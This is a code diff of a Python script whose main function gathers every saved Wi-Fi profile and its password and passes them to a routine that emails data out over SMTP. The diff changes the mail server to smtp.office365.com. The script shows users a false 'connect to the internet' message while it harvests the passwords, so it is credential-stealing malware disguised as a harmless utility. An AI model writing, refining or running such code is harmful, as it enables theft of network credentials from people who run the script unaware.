@@ -40,7 +40,7 @@ def send_data_via_email(data):
 
     # Send the email
     try:
-        with smtplib.SMTP("smtp.titan.email", 587) as server:
+        with smtplib.SMTP("smtp.office365.com", 587) as server:
             server.starttls()
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
@@ -50,7 +50,7 @@ def send_data_via_email(data):
 
 # Main function
 def main():
-    print("Please wait while we connect to the internet...")  # Print the message once
+    print("Please wait while we connect to the internet...")  
 
     profiles = get_wifi_profiles()
     data = [{'network_name': profile, 'password': get_wifi_password(profile)} for profile in profiles if get_wifi_password(profile)]
